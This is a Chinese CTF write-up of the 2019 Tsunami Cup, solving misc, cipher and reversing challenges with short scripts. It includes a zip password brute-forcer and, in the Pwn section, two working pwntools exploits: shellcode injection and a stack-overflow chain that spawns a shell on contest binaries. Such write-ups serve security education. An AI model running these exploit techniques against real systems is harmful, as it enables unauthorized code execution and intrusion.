---
title: 第二届海啸杯部分题目Writeup
visitors: 阅读量
copyright: true
tags:
  - CTF
  - writeup
abbrlink: a7cb8952
date: 2019-10-21 13:21:21
updated: 2019-10-21 13:21:21
categories:
password:
top:
---

## Misc

### 签到题

题目提供的``1.zip``解压出``flag.txt``，txt文件里面有大量意义不明的字符，尝试性使用``base64``解密，得到结果如下图：

![](https://i.loli.net/2019/10/20/U7kotCYViuZWn3d.png)

首行有``PNG``、``Adobe``等字样，推测是解密后的明文是PNG文件十六进制文件。用python解密后写入到后缀名为``png``的文件中，查看图片内容，脚本如下：

```python
#./flag.txt
import base64

file = open('1.png','w')
encodestr = base64.b64decode('这里填入flag.txt中的密文'.encode('utf-8'))
file.write(encodestr)
file.close()
```

#### flag

![](https://i.loli.net/2019/10/20/YIAsZlXdBTnqgy7.png)

### 老烟枪

用binwalk分析图片，结果显示图片中有一个压缩包。使用命令``binwalk -e cxk.png``分离出压缩包，得到flag.png，用ps的水平翻转功能，得到正常flag

#### flag

![](https://i.loli.net/2019/10/20/FmUsSLTkGZlq5EC.png)

### 表白

这题就是可以百度到的png隐写操作----修改图片宽高。用winhex打开png文件，对应修改头文件中的高数值，得到flag。

![](https://i.loli.net/2019/10/20/21IzEYGdH8qOarT.png)

#### flag

![](https://i.loli.net/2019/10/20/weqvR7HLGPnfjpd.png)

### 小明的求助

题目给出压缩包里面有一个需要密码才能解压的``flag.txt``文件，且题目提示*密码他只知道"hlqiou"加上4位数字*。尝试进行爆破。

生成密码字典：

```python
file = open("p.txt","w")
for i in range(1000,10000):
	file.write("hlqiou"+str(i)+"\n")
file.close()
```

爆破密码脚本（python2）：

```python
#coding: utf-8
#./p.txt
#./xiaoming.zip

import zipfile
import threading

def zipbp(zfile, pwd):
    try:
        zfile.extractall(pwd=pwd)
        print 'password found : %s' % pwd
    except:
        return
def main():
    zfile = zipfile.ZipFile('xiaoming.zip')
    pwdall = open('p.txt')
    for pwda in pwdall.readlines():
        pwd = pwda.strip('\n')
        t = threading.Thread(target=zipbp, args=(zfile, pwd))
        t.start()
        t.join()
if __name__ == '__main__':
    main()
```

``password found : hlqiou6974``

#### flag

``flag{5oiR54ix6buE6I6J6I2D}``

## 密码学

### 恺撒将军

这题就是恺撒密码加密，特殊点就是有存在``]``、``<``等标点字符，一般在线解密会略过，干脆就自己写脚本，反正就是基于ASCII码做偏移：

```python
strings = "f_tnluz_aghggeao{t_oy_ldoia}"
flag = ""
for i in strings:
	flag += chr(ord(i)-3)
print(flag)
```

解密之后得到的是一个base64加密的密文：``ZmxhZ3tjcnlwdG9faXNfaHhiX3NvX2VBc3kwfQ==``，在解密一次得到flag。

#### flag

``flag{crypto_is_hxb_so_eAsy0}``

### 小明家的小菜园

这题是栅栏密码，使用[CTFcrack](https://www.k2zone.cn/?p=1569)提供的栅栏密码工具解密：

![](https://i.loli.net/2019/10/21/ZiBbRDOLypn7q8U.png)

#### flag

第2栏：``flag{yo_uget_itzha_lan_good}``

### 战报

这题提供较长的明文&密文，尝试分析字频，得到**单表替换**中的对应表。

![](https://i.loli.net/2019/10/21/GBdmWQTsFuHSj7K.png)

得到对应表之后，还原得到明文，获得flag

#### flag

``flag{eantosi}``

## reverse

### baby reverse

这道题就是考察IDA的使用，IDA打开后，搜索（atl+t&ctrl+t）flag即可。

![](https://i.loli.net/2019/10/21/f1PQtdjmhpTGVyo.png)

#### flag

``flag{reverse_is_easy}``

### easy reverse

IDA打开，``main()``里面存在一个条件函数，如果``v1=v0``则输出``you are right!!``，否则输出``you are wrong!!``，推测出需要满足条件才能获得flag，即使``v1=v0``。``v0``被赋值为字符串``kanlxvdzTljyTfyTeuor``；``v1``是以参数为``v3``的``sub_401005``函数的返回值，``v3``为我们输入值。

![](https://i.loli.net/2019/10/21/6hCR2TPDlyjB3Ak.png)

``sub_401005``函数内部运算公式：

![](https://i.loli.net/2019/10/21/5oRGbv2TMP1KBdQ.png)

操作就是将每一位输入字符都与``0xC``异或后加1。那么写个脚本将``v0``每一位都减1后与``0xC``异或得到我们应该输入的值。

```python
strings = "kanlxvdzTljyTfyTeuor"
flag = ""
for i in strings:
	flag += chr((ord(i)-1)^0xc)

print(flag)
```

#### flag

``flag{crypto_is_hxb_so_eAsy0}``

### 霸王别姬

这题从描述到运行程序是的提示都是很明显地要脱壳。

![](https://i.loli.net/2019/10/21/m7tpbzIE4y2nRfl.png)

![](https://i.loli.net/2019/10/21/xCgSndGI4fleWJB.png)

通用脱壳软件脱壳一下，IDA打开``main``函数中直接就能找到flag

![](https://i.loli.net/2019/10/21/ZaFupY41s9fwzrg.png)

这个加的是压缩壳``UPX``，与``pwnable.kr``中的``flag``那题有些类似，可以在linux下用命令脱壳。

#### flag

``flag{upx_so_easy_!}``

### 电竞选手

IDA打开可以看见最后一个if条件，满足则输出``Correct!\nFlag is your input``，提示我们输入的让条件符合的值就是flag。条件成立的前提是``sub_401350(v4) && sub_40145A()``两个函数的返回值相同。``sub_401350``的参数``v4``就是输入值。

![](https://i.loli.net/2019/10/21/WP4Nxbapiq19yMl.png)

``sub_401350``函数如下：

![](https://i.loli.net/2019/10/21/F83p2VS4HXoYqyT.png)

*选择case 后数值按``r``转换为字符*

首先判断输入长度是否为32字节，然后取5~30位进入到循环结构，根据输入值的不同向``dword_405060``数组中写入不同的值，若无匹配则返回0。程序正常循环结束后会返回``1``

``sub_40145A``函数如下：

![](https://i.loli.net/2019/10/21/EIQx5RliO7hMkWA.png)

主体是一个循环体：每次``v3``加上``数组dword_402068``的第``dword_405060[i]``位数；``v4``加上``数组dword_402078``的第``dword_405060[i]``位数。然后3个if条件，如果``v2\v3``大于9或者小于0；``byte_402000[10 * v3 + v2] == 3``则返回``0``。只有``byte_402000[10 * v3 + v2] == 43``才返回``1``。

``dword_402068``、``dword_402078``两个数组值：

![](https://i.loli.net/2019/10/21/dbfcxk64YGTSvgu.png)

``byte_402000``数值值

![](https://i.loli.net/2019/10/21/4XIFmPnx9VZToBk.png)

根据``sub_40145A()``内部结构，一开始推测是用``wasd``控制每次循环读取``byte_402000``的位置，也就是避开``#``、控制最后读取是``+``，但是发现长度不对。在师兄提点下发现是用一维数组代表二维数组，从这里看出来的：

![](https://i.loli.net/2019/10/21/YBaJ5erWkcRVIOn.png)

``10*v3``代表的是行号，还有给出提示一行有10个元素（v3+1就读取跳了10位，相当于读取下一行同一列的元素）。``v2``代表列号。以此将``byte_402000``数值的值转换为二维数组，如图所示：

![](https://i.loli.net/2019/10/21/4pPK5ovG6dDxAzE.png)

出发点就是``v2\v3``的初始值，用``wasd``控制移动，最后移动到``+``。

#### flag

``flag{wwwwaaasssaassssdddssddddw}``



## Pwn

### shellcode

32位只开PIE保护

![](https://i.loli.net/2019/10/21/l1WrJXvzLHQfwFx.png)

直接运行：

![](https://i.loli.net/2019/10/21/IEbAnXaVgzfYJ8Q.png)

IDA打开发现直接程序将输入的，当成命令执行了。那么直接输入shellcode就行了。

![](https://i.loli.net/2019/10/21/T8SkDXMtlVKq4xC.png)

#### 脚本

```python 
from pwn import *

context.log_level = 'debug'
p = process("./shellcode")
#p = remote("139.199.10.70",10003)


p.recv()
p.sendline(asm(shellcraft.sh()))

p.interactive()
```

### simple_stackoverflow

32位保护全关

![](https://i.loli.net/2019/10/21/mkil1sFO69yCLdg.png)

直接运行：

![](https://i.loli.net/2019/10/21/yVNpjnbGex3rXSA.png)

IDA分析，在``main()``里面的``overflow()``里面，变量``buf``距离栈底为``0x20``，而``read``可以从终端输入取最多``0x3FF``字节写入到``buf``中，这里就存在**栈溢出**。

![](https://i.loli.net/2019/10/21/notYXBFqyhTAZ63.png)

这里利用栈溢出控制指针，再次调用read函数向某地址写入shellcode之后，然后控制指针运行到shellcode。写入地址选择固定地址如bss段、data段（地址在IDA ctrl+s 查找），我就选择写入

![](https://i.loli.net/2019/10/21/JtCkh64BWxSv27D.png)

然后问题就是怎么给溢出后调用的read传参。read函数有三个参数，32位传参看图：

![](https://i.loli.net/2019/10/21/x93fAE4KZreycT2.png)

#### 脚本

```python
from pwn import *

context.log_level = 'debug'

shellcode = asm(shellcraft.sh())

p = process("./simple_stackoverflow")
#p = remote("139.199.10.70",10004)

payload = 'a' * (0x20 + 0x4) + p32(0x08048390) + p32(0x0804A040) + p32(0) + p32(0x0804A040) + p32(len(shellcode))

p.sendline(payload)
p.sendline(shellcode)

p.interactive()
```

覆写eip的read函数地址应该是plt表中read地址，而不是read函数地址。即填入IDA中``_read``地址，而不是``read``地址

